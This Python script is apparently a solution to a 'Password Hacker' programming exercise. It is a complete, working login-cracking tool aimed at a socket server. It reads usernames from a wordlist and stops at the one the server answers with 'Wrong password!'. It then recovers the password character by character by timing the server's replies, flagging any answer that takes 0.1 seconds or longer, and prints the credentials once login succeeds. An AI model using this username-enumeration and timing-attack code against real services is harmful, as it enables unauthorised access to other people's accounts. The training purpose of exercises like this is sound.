import socket
import argparse
import json
import string
import time


def open_file(file_):
    with open(file_, 'r', encoding='utf-8') as file_:
        lines = file_.readlines()
        stripped_lines = [line.strip() for line in lines]
        return stripped_lines


def guess_login(address_):
    logins = open_file(r'D:\PyCharm 2023.1.2\Projects\Password Hacker (Python)\Password Hacker (Python)\task\logins.txt')
    json_auth = {"login": "", "password": " "}

    with socket.socket() as client_socket:
        client_socket.connect(address_)

        for login in logins:
            json_auth['login'] = login
            json_auth_str = json.dumps(json_auth)
            json_auth_encoded = json_auth_str.encode()
            client_socket.send(json_auth_encoded)
            response = client_socket.recv(1024)
            response = response.decode()
            if 'Wrong password!' in response:
                json_auth['login'] = login
                break

        characters = string.ascii_letters + string.digits
        json_auth['password'] = json_auth['password'][:-1]
        current_password = ''
        while True:
            for char in characters:
                json_auth['password'] = current_password + char
                json_auth_str = json.dumps(json_auth)
                json_auth_encoded = json_auth_str.encode()
                start = time.time()
                client_socket.send(json_auth_encoded)
                response = client_socket.recv(1024)
                end = time.time()
                response = response.decode()
                if end - start >= 0.1:
                    current_password += char
                elif 'Connection success!' in response:
                    return json.dumps(json_auth)


parser = argparse.ArgumentParser()
parser.add_argument('ip')
parser.add_argument('port', type=int)

args = parser.parse_args()
address = (args.ip, args.port)

print(guess_login(address))
